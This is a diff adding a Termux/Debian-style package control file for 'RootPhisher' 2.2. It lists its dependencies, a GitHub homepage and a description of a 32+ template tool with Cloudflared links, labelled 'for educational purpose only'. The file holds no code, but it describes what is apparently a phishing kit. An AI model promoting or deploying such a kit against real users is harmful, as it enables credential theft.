@@ -1,0 +1,8 @@
+Package: RootPhisher
+Version: 2.2
+Installed-Size:  1065
+Architecture: all
+Maintainer: @HrYuviJoon 
+Depends: php, wget, git, curl, resolv-conf, proot
+Homepage: https://github.com/HrYuviJoon/RootPhisher 
+Description: A 32+ Template Tool With Cloudflared Link RootPhisher This Tool is made for educational purpose only !
